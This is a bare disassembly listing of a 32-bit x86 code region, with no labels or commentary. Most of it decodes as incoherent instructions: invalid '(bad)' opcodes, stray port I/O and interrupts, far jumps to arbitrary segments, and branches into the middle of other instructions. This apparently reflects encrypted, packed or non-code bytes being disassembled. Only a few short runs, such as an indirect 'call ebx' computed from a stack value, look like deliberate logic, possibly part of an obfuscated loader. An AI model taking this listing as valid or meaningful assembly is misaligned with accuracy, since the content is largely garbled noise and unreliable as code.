  41c4aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ab:	aad    0xb7
  41c4ad:	sbb    edx,DWORD PTR [ebp+edx*8-0x17b0654c]
  41c4b4:	in     eax,dx
  41c4b5:	add    al,0x56
  41c4b7:	add    DWORD PTR [ebx],ebp
  41c4b9:	jecxz  0x41c488
  41c4bb:	fld    TBYTE PTR [edi+0x3d3cefda]
  41c4c1:	dec    esp
  41c4c2:	push   edx
  41c4c3:	xchg   ecx,eax
  41c4c4:	(bad)  
  41c4c5:	icebp  
  41c4c6:	jmp    0xc204:0x3508c0d8
  41c4cd:	mov    bl,0x51
  41c4cf:	push   ds
  41c4d0:	xchg   esi,eax
  41c4d1:	mov    eax,ds:0x977b1f39
  41c4d6:	sbb    eax,0xcd90683a
  41c4db:	mov    eax,esi
  41c4dd:	bswap  edi
  41c4df:	or     eax,0x9b196b43
  41c4e4:	aas    
  41c4e5:	jbe    0x41c4d9
  41c4e7:	fdivr  DWORD PTR [ecx]
  41c4e9:	adc    al,0x5d
  41c4eb:	cld    
  41c4ec:	push   edx
  41c4ed:	push   0x7bcd0856
  41c4f2:	jle    0x41c505
  41c4f4:	jb     0x41c51b
  41c4f6:	stos   BYTE PTR es:[edi],al
  41c4f7:	mov    bh,0xeb
  41c4f9:	inc    ebx
  41c4fa:	daa    
  41c4fb:	mov    ?,WORD PTR [ebp-0x46bcf979]
  41c501:	xor    al,0xc2
  41c503:	add    eax,0xb66e7262
  41c508:	pusha  
  41c509:	or     DWORD PTR [ecx-0x3e],eax
  41c50c:	test   DWORD PTR [ecx],esi
  41c50e:	shl    BYTE PTR [esi+0x27],0x24
  41c512:	fcom   DWORD PTR [esi+0x514da6fa]
  41c518:	xor    al,0xd0
  41c51a:	pop    ebx
  41c51b:	sub    edx,ebx
  41c51d:	jg     0x41c4c6
  41c51f:	inc    edx
  41c520:	jo     0x41c4de
  41c522:	ins    BYTE PTR es:[edi],dx
  41c523:	mov    esi,0xbc8b2c13
  41c528:	push   0xdc0521e5
  41c52d:	xchg   ebx,eax
  41c52e:	(bad)  
  41c52f:	in     eax,dx
  41c530:	pusha  
  41c531:	jns    0x41c580
  41c533:	mov    DWORD PTR ds:0xf8090972,ebp
  41c539:	sbb    ebx,ebx
  41c53b:	xor    al,0x3b
  41c53d:	push   edi
  41c53e:	jno    0x41c4c8
  41c540:	sub    al,0x5b
  41c542:	rcr    DWORD PTR ds:0xa2ec835b,1
  41c548:	adc    eax,0xae59bc24
  41c54d:	jmp    0x2e8b7d91
  41c552:	jecxz  0x41c5a4
  41c554:	xchg   edi,eax
  41c555:	push   ebx
  41c556:	dec    esp
  41c557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c558:	std    
  41c559:	stos   BYTE PTR es:[edi],al
  41c55a:	inc    ebx
  41c55b:	sub    edi,esi
  41c55d:	sti    
  41c55e:	pop    edi
  41c55f:	repz jge 0x41c5ae
  41c562:	std    
  41c563:	jbe    0x41c5a7
  41c565:	jbe    0x41c5c8
  41c567:	sub    bh,BYTE PTR [edx+edi*4]
  41c56a:	not    ebx
  41c56c:	sub    BYTE PTR [edx+0x66],cl
  41c56f:	cmp    BYTE PTR [ebp-0x71],bh
  41c572:	or     BYTE PTR gs:[edx],bl
  41c575:	(bad)  
  41c576:	jae    0x41c5f4
  41c578:	dec    eax
  41c579:	out    0xee,eax
  41c57b:	or     DWORD PTR ss:[edx],ebx
  41c57e:	popf   
  41c57f:	jmp    0xec6c28ce
  41c584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c585:	int    0xe1
  41c587:	in     eax,0x2b
  41c589:	fs stos DWORD PTR es:[edi],eax
  41c58b:	jle    0x41c54a
  41c58d:	les    ebp,FWORD PTR [ecx]
  41c58f:	jno    0x41c5d6
  41c591:	xor    dx,cx
  41c594:	and    eax,0x71e5e6d8
  41c599:	imul   BYTE PTR [edi]
  41c59b:	aam    0x9a
  41c59d:	aad    0xe2
  41c59f:	adc    ebp,DWORD PTR [ecx+0x34]
  41c5a2:	gs popf 
  41c5a4:	js     0x41c5bf
  41c5a6:	int    0xa5
  41c5a8:	popf   
  41c5a9:	inc    edx
  41c5aa:	pop    ebp
  41c5ab:	and    eax,0x3a64e273
  41c5b0:	fwait
  41c5b1:	pop    esi
  41c5b2:	adc    eax,0x6b5de605
  41c5b7:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41c5b9:	jmp    0x41c5ad
  41c5bb:	js     0x41c58c
  41c5bd:	jns    0x41c5e6
  41c5bf:	or     BYTE PTR [eax],dl
  41c5c1:	repz adc edi,eax
  41c5c4:	stc    
  41c5c5:	call   0x6170f925
  41c5ca:	sbb    ebp,DWORD PTR ds:0x34049187
  41c5d0:	push   ecx
  41c5d1:	cdq    
  41c5d2:	ins    BYTE PTR es:[edi],dx
  41c5d3:	in     eax,0x92
  41c5d5:	jne    0x41c5fe
  41c5d7:	push   ss
  41c5d8:	scas   eax,DWORD PTR es:[edi]
  41c5d9:	outs   dx,BYTE PTR ds:[esi]
  41c5da:	bound  ebx,QWORD PTR [edi+esi*8]
  41c5dd:	mov    ch,0xc9
  41c5df:	bound  edx,QWORD PTR [eax+eax*4]
  41c5e2:	inc    edi
  41c5e3:	sti    
  41c5e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5e5:	jg     0x41c5c5
  41c5e7:	and    BYTE PTR [ebp-0x15],bl
  41c5ea:	or     al,0xcf
  41c5ed:	arpl   bp,ax
  41c5ef:	mov    cs,edi
  41c5f1:	addr16 pop ebx
  41c5f3:	in     al,0x7a
  41c5f5:	lss    edx,FWORD PTR [edi+0x41]
  41c5f9:	jmp    0xa96ae5
  41c5fe:	mov    fs,WORD PTR [edx+0x5f85902e]
  41c604:	adc    cl,dh
  41c606:	mov    ds:0xef32ceb6,eax
  41c60b:	fistp  DWORD PTR [eax+ebp*4+0x76fbaa0d]
  41c612:	or     al,0x96
  41c614:	inc    ebp
  41c615:	jne    0x41c66b
  41c617:	jae    0x41c629
  41c619:	and    eax,0x86f9e335
  41c61e:	out    0x32,eax
  41c620:	sub    al,0xc6
  41c622:	inc    eax
  41c623:	pusha  
  41c624:	jne    0x41c5b5
  41c626:	pop    ecx
  41c627:	sub    BYTE PTR [edi+0x6c67896b],0xed
  41c62e:	lods   eax,DWORD PTR ds:[esi]
  41c62f:	cmp    BYTE PTR [ecx],ch
  41c631:	push   esp
  41c632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c633:	fwait
  41c634:	dec    ebp
  41c635:	jl     0x41c5e1
  41c637:	mov    al,0x69
  41c639:	push   0x6d
  41c63b:	jae    0x41c5e1
  41c63d:	ret    
  41c63e:	out    dx,eax
  41c63f:	cmp    al,0x8a
  41c641:	nop
  41c642:	inc    ecx
  41c643:	inc    edx
  41c644:	fst    DWORD PTR [ecx-0x6f4c57a3]
  41c64a:	enter  0xdc02,0xe4
  41c64e:	mov    dl,0xa0
  41c650:	mov    cl,0xd0
  41c652:	mov    ds:0x3e97eeb0,al
  41c657:	mov    ebx,0x754bdfab
  41c65c:	jmp    0x41c6ae
  41c65e:	pop    esp
  41c65f:	retf   
  41c660:	jp     0x41c688
  41c662:	sub    DWORD PTR [ebp+0x4a],esp
  41c665:	cmp    al,0x29
  41c667:	mov    bh,0x28
  41c669:	sbb    eax,0x51503140
  41c66e:	mov    dh,ch
  41c670:	mov    ds:0x51655174,eax
  41c675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c676:	das    
  41c677:	or     bh,BYTE PTR [edi+0x3e2d9d2e]
  41c67d:	scas   eax,DWORD PTR es:[di]
  41c67f:	and    eax,eax
  41c681:	in     eax,0xd5
  41c683:	icebp  
  41c684:	push   ebx
  41c685:	ficomp DWORD PTR [esi]
  41c687:	xor    ebx,ebx
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x6add773e,eax
  41c6cc:	fsub   st(5),st
  41c6ce:	add    cl,dh
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c6bd
  41c6d7:	sub    ebx,DWORD PTR [ecx+0x73]
  41c6da:	pusha  
  41c6db:	enter  0x8d28,0x9b
  41c6df:	jae    0x41c67b
  41c6e1:	imul   edx,DWORD PTR [esi-0x7d],0x3
  41c6e5:	shr    DWORD PTR [esi+0x78],0x71
  41c6e9:	pushf  
  41c6ea:	sub    eax,0xe280a91b
  41c6ef:	sbb    BYTE PTR [ebx],dh
  41c6f1:	out    0xad,eax
  41c6f3:	jecxz  0x41c67c
  41c6f5:	cdq    
  41c6f6:	mov    ch,0x1a
  41c6f8:	popa   
  41c6f9:	push   cs
  41c6fa:	mov    bh,0x87
  41c6fc:	dec    esp
  41c6fd:	sahf   
  41c6fe:	scas   eax,DWORD PTR es:[edi]
  41c6ff:	jae    0x41c713
  41c701:	in     al,dx
  41c702:	dec    ebx
  41c703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c704:	test   eax,0x352710bd
  41c709:	inc    edx
  41c70a:	or     bh,BYTE PTR [ecx]
  41c70c:	ret    
  41c70d:	push   eax
  41c70e:	loope  0x41c76b
  41c710:	popf   
  41c711:	div    BYTE PTR [eax+0x47]
  41c714:	mov    bl,0xb1
  41c716:	xchg   edi,eax
  41c717:	inc    esi
  41c718:	adc    DWORD PTR [eax],esp
  41c71a:	cmp    edx,0xffffffa3
  41c71d:	in     eax,0x26
  41c71f:	pop    edi
  41c720:	cs (bad) 
  41c722:	jmp    0xe2a1:0x667564c7
  41c729:	cwde   
  41c72a:	fdiv   st,st(7)
  41c72c:	dec    si
  41c72e:	xchg   dl,cl
  41c730:	dec    edx
  41c731:	dec    esp
  41c732:	sub    bh,BYTE PTR [esi+0x55]
  41c735:	push   ebx
  41c736:	push   ds
  41c737:	out    dx,eax
  41c738:	xchg   esi,eax
  41c739:	cmp    eax,0x389f65e7
  41c73e:	jp     0x41c76a
  41c740:	lods   eax,DWORD PTR ds:[esi]
  41c741:	inc    esi
  41c742:	nop
  41c743:	inc    edi
  41c744:	(bad)  
  41c745:	xchg   ebp,eax
  41c746:	(bad)
  41c74b:	repnz lods al,BYTE PTR ds:[esi]
  41c74d:	cwde   
  41c74e:	imul   edx,DWORD PTR [eax-0x3e],0xffffffa9
  41c752:	mov    al,0x97
  41c754:	push   cs
  41c755:	shl    BYTE PTR [ebx+0x10],1
  41c758:	push   edi
  41c759:	das    
  41c75a:	sbb    al,0xe4
  41c75c:	xchg   ecx,eax
  41c75d:	xor    BYTE PTR [edx+0xf],ch
  41c760:	loope  0x41c784
  41c762:	add    eax,0x86507473
  41c767:	jnp    0x41c743
  41c769:	push   ebp
  41c76a:	jbe    0x41c746
  41c76c:	fldcw  WORD PTR [esp+esi*8]
  41c76f:	daa    
  41c770:	retf   
  41c771:	sub    al,0x4f
  41c773:	push   0xffffffc1
  41c775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c776:	inc    ebp
  41c777:	xchg   esi,eax
  41c778:	(bad)
  41c77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c77c:	div    dh
  41c77e:	sbb    eax,ecx
  41c780:	les    ebx,FWORD PTR ds:0x84a3b54
  41c786:	fadd   DWORD PTR [edx+edi*2+0x6af66c49]
  41c78d:	and    eax,0x32fddfc7
  41c792:	out    dx,al
  41c793:	outs   dx,BYTE PTR ds:[esi]
  41c794:	xor    dl,BYTE PTR [esi-0x6cf51dda]
  41c79a:	cmp    bl,ch
  41c79c:	outs   dx,BYTE PTR ds:[esi]
  41c79d:	xor    ebp,esi
  41c79f:	xor    BYTE PTR [eax-0x36],0x39
  41c7a3:	xchg   esi,eax
  41c7a4:	ins    BYTE PTR es:[edi],dx
  41c7a5:	out    dx,eax
  41c7a6:	outs   dx,BYTE PTR ds:[esi]
  41c7a7:	les    ecx,FWORD PTR [ebx+0x36196dff]
  41c7ad:	add    dl,bl
  41c7af:	ret    
  41c7b0:	push   ecx
  41c7b1:	test   DWORD PTR [ebx-0x3a77dbfa],esp
  41c7b7:	sbb    DWORD PTR [ebp-0x6d],edi
  41c7ba:	xchg   esp,eax
  41c7bb:	pusha  
  41c7bc:	sub    eax,DWORD PTR [ebx+0x42]
  41c7bf:	clc    
  41c7c0:	and    bl,BYTE PTR [esi+0x4a0a5707]
  41c7c6:	aad    0xc4
  41c7c8:	sbb    ch,bh
  41c7ca:	mov    ds:0x240f8e9a,eax
  41c7cf:	or     DWORD PTR [ebx+0x70f09634],edi
  41c7d5:	inc    esi
  41c7d6:	out    0x28,al
  41c7d8:	pop    ds
  41c7d9:	dec    esp
  41c7da:	(bad)  
  41c7db:	(bad)  
  41c7dc:	(bad)  
  41c7dd:	jno    0x41c794
  41c7df:	cdq    
  41c7e0:	cs cdq 
  41c7e2:	add    eax,DWORD PTR [eax-0x13]
  41c7e5:	rcl    edx,cl
  41c7e7:	xchg   ebx,eax
  41c7e8:	cmp    al,dh
  41c7ea:	aaa    
  41c7eb:	fxrstor [edi-0x1d]
  41c7ef:	jmp    0x41c7ca
  41c7f1:	jmp    0x41c844
  41c7f3:	pop    es
  41c7f4:	enter  0xb09f,0xd7
  41c7f8:	retf   
  41c7f9:	mov    esi,0x698470f5
  41c7fe:	fsubr  DWORD PTR [edx]
  41c800:	mov    ds,WORD PTR [edx+0x508ccfc4]
  41c806:	mov    dh,0xc4
  41c808:	mov    ebx,0x5fd9cb6a
  41c80d:	inc    edx
  41c80e:	mov    esp,0x42f29a6f
  41c813:	sub    DWORD PTR [edx],ecx
  41c815:	in     eax,dx
  41c816:	adc    eax,0x4ded2a3b
  41c81b:	and    al,0xa0
  41c81d:	dec    esi
  41c81e:	and    ch,BYTE PTR [ebp+edx*4+0x394ffb65]
  41c825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c826:	add    BYTE PTR [edi],cl
  41c828:	mov    dh,0x5b
  41c82a:	or     al,0x81
  41c82c:	pop    eax
  41c82d:	je     0x41c89d
  41c82f:	dec    esi
  41c830:	dec    esi
  41c831:	dec    ebx
  41c832:	mov    dh,0x44
  41c834:	mov    edx,0xb9c601f3
  41c839:	add    eax,0x565bb867
  41c83e:	xor    ebp,DWORD PTR [ecx+0x36]
  41c841:	jno    0x41c884
  41c843:	into   
  41c844:	mov    esi,0xaa70cbb2
  41c849:	mov    ss,WORD PTR [ebx-0x33ca0873]
  41c84f:	fs xor eax,0x4ec8704e
  41c855:	xchg   ecx,eax
  41c856:	fst    QWORD PTR [edx+0x75]
  41c859:	scas   eax,DWORD PTR es:[edi]
  41c85a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c85b:	xchg   DWORD PTR [ebp-0x5bdd6b0e],ecx
  41c861:	test   eax,0x50d367b5
  41c866:	inc    eax
  41c867:	add    cl,BYTE PTR [eax]
  41c869:	push   es
  41c86a:	add    DWORD PTR [ebp-0x504e896],esp
  41c870:	cmp    DWORD PTR [edi],esi
  41c872:	sti    
  41c873:	rcl    DWORD PTR [ebp-0x21],1
  41c876:	mov    dh,ah
  41c878:	mov    ds:0x6ff15d04,eax
  41c87d:	push   es
  41c87e:	out    0xa6,eax
  41c880:	test   ebp,edx
  41c882:	in     al,0x2e
  41c884:	sub    al,0xbe
  41c886:	or     ch,dh
  41c888:	outs   dx,DWORD PTR ds:[esi]
  41c889:	or     esp,DWORD PTR [ebx-0x17]
  41c88c:	cli    
  41c88d:	pop    ecx
  41c88e:	pop    edi
  41c88f:	cli    
  41c890:	jg     0x41c8cb
  41c892:	jns    0x41c871
  41c894:	out    dx,al
  41c895:	outs   dx,DWORD PTR ds:[esi]
  41c896:	rcr    DWORD PTR [esp+eiz*2+0x6dc6523f],0x7d
  41c89e:	out    dx,al
  41c89f:	and    al,0x84
  41c8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8a2:	(bad)  
  41c8a3:	jns    0x41c8a7
  41c8a5:	add    BYTE PTR [eax],al
  41c8a7:	into   
  41c8a8:	pusha  
  41c8a9:	dec    ebp
  41c8aa:	rcl    DWORD PTR [ebx],0xfd
  41c8ad:	xor    eax,0x980e4d02
  41c8b2:	addr16 mov eax,0xf4c4aef1
  41c8b8:	cmp    BYTE PTR [ecx+ebp*4],0x57
  41c8bc:	loop   0x41c8db
  41c8be:	jecxz  0x41c8fb
  41c8c0:	loopne 0x41c853
  41c8c2:	pop    esi
  41c8c3:	icebp  
  41c8c4:	inc    ebx
  41c8c5:	ja     0x41c8e3
  41c8c7:	add    ecx,eax
  41c8c9:	int    0xf6
  41c8cb:	mov    al,ds:0x3f07abf0
  41c8d0:	xchg   ah,ah
  41c8d2:	btc    DWORD PTR [edx-0x430b5f77],eax
  41c8d9:	inc    esi
  41c8da:	pushf  
  41c8db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8dc:	adc    bl,BYTE PTR gs:[esi-0x2392a7f5]
  41c8e3:	hlt    
  41c8e4:	xor    bh,BYTE PTR ds:0x3df4970b
  41c8ea:	adc    al,0x95
  41c8ec:	mov    eax,ds:0x3434ab4
  41c8f1:	sbb    al,0x1a
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	xor    DWORD PTR ds:0xf718d83b,ebx
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c8dc
  41c91c:	in     eax,0x22
  41c91e:	pop    edi
  41c91f:	pop    ss
  41c920:	xchg   esp,eax
  41c921:	xor    al,0xe2
  41c923:	jb     0x41c94c
  41c925:	ins    DWORD PTR es:[edi],dx
  41c926:	push   0x64
  41c928:	stos   DWORD PTR es:[edi],eax
  41c929:	pop    ecx
  41c92a:	repz and esp,DWORD PTR [esp+esi*8+0x46]
  41c92f:	inc    ebx
  41c930:	aad    0x84
  41c932:	neg    DWORD PTR [edx+0x5f91eabf]
  41c938:	out    0x5e,al
  41c93a:	fmul   QWORD PTR [edx+edi*4+0x1c]
  41c93e:	and    BYTE PTR ds:0x63161550,ah
  41c944:	retf   
  41c945:	shl    DWORD PTR [edi+0x23],0xbe
  41c949:	pop    ebx
  41c94a:	lea    esi,[esi]
  41c94c:	cdq    
  41c94d:	xor    DWORD PTR [esp+esi*8-0x24],eax
  41c951:	call   0xff25:0x18696d69
  41c958:	icebp  
  41c959:	dec    edx
  41c95a:	cld    
  41c95b:	mov    ebp,DWORD PTR [edx+0x1e]
  41c95e:	sub    eax,0xbe676aad
  41c963:	dec    edx
  41c964:	mov    DWORD PTR [eax-0x2c31ca4e],ecx
  41c96a:	cmp    eax,0x70eac99b
  41c96f:	fistp  DWORD PTR [eax-0x2a93205f]
  41c975:	retf   
  41c976:	pusha  
  41c977:	cld    
  41c978:	cmp    al,0xe3
  41c97a:	mov    al,ds:0x59ba1081
  41c97f:	or     al,0x7d
  41c981:	mov    cl,0x2f
  41c983:	sahf   
  41c984:	sub    eax,0xc864635
  41c989:	gs mov esp,0x24b65a01
  41c98f:	and    BYTE PTR [ebp+0x3a],al
  41c992:	(bad)  
  41c993:	cli    
  41c994:	je     0x41c9f6
  41c996:	mov    al,ds:0x2b379763
  41c99b:	push   es
  41c99c:	or     ah,BYTE PTR [edi-0x5ac4d1f5]
  41c9a2:	push   ds
  41c9a3:	or     eax,0x5771c0dc
  41c9a8:	mov    bh,0xff
  41c9aa:	aad    0x2f
  41c9ac:	inc    esp
  41c9ad:	rcl    dl,1
  41c9af:	add    DWORD PTR [edi],edi
  41c9b1:	fidiv  WORD PTR [esi+0x36c5858d]
  41c9b7:	pop    eax
  41c9b8:	or     al,0xe5
  41c9ba:	and    al,0x2a
  41c9bc:	call   0x4cd00d5c
  41c9c1:	mov    ds:0x7dddb399,eax
  41c9c6:	ja     0x41ca3f
  41c9c8:	and    dl,BYTE PTR [edx-0x2ec11123]
  41c9ce:	jmp    0xa66b:0x830bc7db
  41c9d5:	mov    BYTE PTR [ebp-0x1dcbf7e],bl
  41c9db:	jg     0x41ca0e
  41c9dd:	and    eax,DWORD PTR [eax]
  41c9df:	cmp    al,0xc9
  41c9e1:	ins    BYTE PTR es:[edi],dx
  41c9e2:	clc    
  41c9e3:	int3   
  41c9e4:	add    al,0x17
  41c9e6:	push   es
  41c9e7:	clc    
  41c9e8:	push   cs
  41c9e9:	ins    DWORD PTR es:[edi],dx
  41c9ea:	xor    ebp,edx
  41c9ec:	fistp  WORD PTR [ebx-0x4c4af926]
  41c9f2:	xor    edi,esp
  41c9f4:	aad    0x2b
  41c9f6:	retf   0xd39a
  41c9f9:	and    al,bl
  41c9fb:	mov    edi,0x297018e5
  41ca00:	ja     0x41c9bb
  41ca02:	ror    BYTE PTR [ebp+0x3a61b2ab],0x65
  41ca09:	cmovnp edx,DWORD PTR [esi]
  41ca0c:	cmp    al,0x9b
  41ca0e:	push   esi
  41ca0f:	in     eax,0xef
  41ca11:	(bad)
  41ca14:	mov    ds,WORD PTR ds:0x4b23cf1
  41ca1a:	xor    ch,0xb
  41ca1d:	xchg   ebx,eax
  41ca1f:	ss cdq 
  41ca21:	push   0x353d7ec8
  41ca26:	and    eax,0xc37d368d
  41ca2b:	retf   0x115
  41ca2e:	scas   al,BYTE PTR es:[edi]
  41ca2f:	sti    
  41ca30:	adc    edi,DWORD PTR [eax-0x1f58ecf3]
  41ca36:	inc    edx
  41ca37:	leave  
  41ca38:	std    
  41ca39:	adc    BYTE PTR [ecx+ebx*2],0xd4
  41ca3d:	cmp    BYTE PTR [esi-0x4e],ah
  41ca40:	dec    edx
  41ca41:	push   eax
  41ca42:	stos   BYTE PTR es:[edi],al
  41ca43:	fcomp  DWORD PTR [ebx+0x79]
  41ca46:	lds    ebp,FWORD PTR [eax+ebp*2-0x46]
  41ca4a:	jae    0x41caa8
  41ca4c:	sub    al,0x22
  41ca4e:	fst    QWORD PTR [edi-0x231c790d]
  41ca54:	jg     0x41c9ff
  41ca56:	mov    ch,BYTE PTR [esi]
  41ca58:	push   ebx
  41ca59:	rcr    ebx,1
  41ca5b:	icebp  
  41ca5c:	jmp    0x41caaf
  41ca5e:	jns    0x41ca4a
  41ca60:	add    al,0x75
  41ca62:	add    BYTE PTR [esi+0x1ff84386],bh
  41ca68:	(bad)  [edi+0x37136b]
  41ca6e:	push   edi
  41ca6f:	jl     0x41ca3a
  41ca71:	jle    0x41caf0
  41ca73:	mov    ds:0x2027b87c,eax
  41ca78:	cmc    
  41ca79:	addr16 xchg ebp,eax
  41ca7b:	ins    BYTE PTR es:[edi],dx
  41ca7c:	fstp   QWORD PTR ds:0x7763a0a1
  41ca82:	mov    ebp,0x238bde8f
  41ca87:	fidivr WORD PTR [edi-0x26]
  41ca8a:	lods   eax,DWORD PTR ds:[esi]
  41ca8b:	out    0x86,eax
  41ca8d:	dec    ebx
  41ca8e:	shr    BYTE PTR [ebp+ecx*1-0x7c],0x25
  41ca93:	clc    
  41ca94:	outs   dx,DWORD PTR ds:[esi]
  41ca95:	loop   0x41ca9b
  41ca97:	and    eax,0xef3d50d
  41ca9c:	int    0x80
  41ca9e:	data16 int 0xc8
  41caa1:	push   eax
  41caa2:	aad    0x30
  41caa4:	dec    eax
  41caa5:	or     eax,0xf294d3c9
  41caaa:	loopne 0x41ca85
  41caac:	or     BYTE PTR [ecx+edi*4+0x273aa4fe],cl
  41cab3:	adc    DWORD PTR [edi],esi
  41cab5:	cmp    al,0x2f
  41cab7:	jmp    0xa612eb0d
  41cabc:	and    DWORD PTR es:0x71d9b45d,edi
  41cac3:	jnp    0x41caca
  41cac5:	inc    edx
  41cac6:	push   ss
  41cac7:	mov    esp,0x9ef13db0
  41cacc:	ins    DWORD PTR es:[edi],dx
  41cacd:	retf   0x4c5c
  41cad0:	(bad)  
  41cad1:	fild   WORD PTR [eax+0x26f0f2b8]
  41cad7:	pop    ss
  41cad8:	out    dx,al
  41cad9:	cmp    BYTE PTR [ebx-0x60],dh
  41cadc:	(bad)  
  41cadd:	mov    al,0x1b
  41cadf:	mov    DWORD PTR [edi-0x57e34b10],eax
  41cae5:	ret    
  41cae6:	jns    0x41ca84
  41cae8:	pop    ebp
  41cae9:	lea    ebp,[esp+eax*4+0x4f]
  41caed:	push   edi
  41caee:	cmp    ah,BYTE PTR [esi-0x6146f2d2]
  41caf4:	rcr    DWORD PTR [ebp+0x56],cl
  41caf7:	mov    ds:0xc44f4508,eax
  41cafc:	and    edx,DWORD PTR [esi+0x6aa27d28]
  41cb02:	xchg   esp,eax
  41cb03:	int3   
  41cb04:	dec    esp
  41cb05:	int    0xce
  41cb07:	mov    ch,0x8f
  41cb09:	stc    
  41cb0a:	cmp    al,0x84
  41cb0c:	mov    ah,0xed
  41cb0e:	xor    eax,0x6dc992
  41cb13:	sub    eax,0x6155c4f3
  41cb18:	jmp    DWORD PTR [eax-0x77674041]
  41cb1e:	jle    0x41cb7b
  41cb20:	cmp    ecx,DWORD PTR [ebp-0x78912352]
  41cb26:	dec    ebx
  41cb27:	lds    eax,FWORD PTR [edx-0x3752ebb9]
  41cb2d:	mov    ch,0xdf
  41cb2f:	test   eax,0x5e1f188d
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x36236037
  41cb47:	aad    0x1d
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cb5c
  41cb52:	mov    edx,0xa810bb2
  41cb57:	arpl   WORD PTR [esi],si
  41cb59:	or     BYTE PTR [ebx-0x6f],bh
  41cb5c:	out    0x8f,al
  41cb5e:	out    0xfa,eax
  41cb60:	shr    DWORD PTR [ebp+0x33],cl
  41cb63:	daa    
  41cb64:	(bad)  
  41cb65:	in     al,dx
  41cb66:	cmp    al,BYTE PTR [ecx-0xe09ffa0]
  41cb6c:	in     al,0xfc
  41cb6e:	sti    
  41cb6f:	imul   eax,DWORD PTR [edx+0x7faa44fe],0xffffffb4
  41cb76:	sub    BYTE PTR [eax-0x36],0x8f
  41cb7a:	and    al,0x61
  41cb7c:	and    BYTE PTR [eax-0x1ba9222d],dl
  41cb82:	cmp    BYTE PTR [ecx+0x74],bh
  41cb85:	jmp    0x2d27901
  41cb8a:	mov    bh,0x1f
  41cb8c:	jns    0x41cb77
  41cb8e:	ss inc edi
  41cb90:	inc    ebx
  41cb91:	jmp    0x41cb64
  41cb93:	add    eax,0x5dc86d6c
  41cb98:	add    al,0xc8
  41cb9a:	fild   DWORD PTR [edx]
  41cb9c:	fadd   QWORD PTR [eax-0x2e489f32]
  41cba2:	test   DWORD PTR [esi],ebp
  41cba4:	push   esp
  41cba5:	bound  edi,QWORD PTR [esi-0x75]
  41cba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cba9:	out    dx,eax
  41cbaa:	jne    0x41cb4f
  41cbac:	xor    BYTE PTR [ebx+0x4a],0x1b
  41cbb0:	cmp    DWORD PTR [ecx+0x44],esp
  41cbb3:	jmp    0xd03a5d45
  41cbb8:	aas    
  41cbb9:	popf   
  41cbba:	and    DWORD PTR [edi],ebp
  41cbbc:	mov    DWORD PTR [edx+0x65],ebp
  41cbbf:	mov    esi,0x8397d3f4
  41cbc4:	lahf   
  41cbc5:	call   0xb6496b9a
  41cbca:	xor    al,0xd9
  41cbcc:	xchg   edx,eax
  41cbcd:	sub    eax,0x40bf8c26
  41cbd2:	mov    ds:0x3ed9162f,al
  41cbd7:	adc    al,bh
  41cbd9:	xchg   ecx,eax
  41cbda:	sbb    al,0x89
  41cbdc:	mov    eax,0x367122cc
  41cbe1:	xchg   edx,eax
  41cbe2:	xor    eax,DWORD PTR [ebp-0x76f5e02]
  41cbe8:	dec    ebp
  41cbe9:	xlat   BYTE PTR ds:[ebx]
  41cbea:	xor    cl,BYTE PTR [ebx-0x80]
  41cbed:	jns    0x41cbce
  41cbef:	dec    ebp
  41cbf0:	daa    
  41cbf1:	call   0x75a8b4f6
  41cbf6:	or     esp,edx
  41cbf8:	mov    ebp,0xb6aaf2bf
  41cbfd:	les    esi,FWORD PTR [esi]
  41cbff:	jmp    0x41cba3
  41cc01:	push   esi
